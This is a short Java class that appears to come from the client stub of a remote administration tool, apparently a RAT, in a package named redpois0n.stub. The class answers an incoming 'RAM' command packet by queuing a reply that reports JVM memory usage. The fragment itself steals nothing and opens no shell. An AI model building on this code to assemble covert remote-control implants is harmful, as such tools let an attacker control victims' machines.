package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.stub.packets.outgoing.Packet24JVMMemory;

public class Packet33RAM extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet24JVMMemory());
	}

}
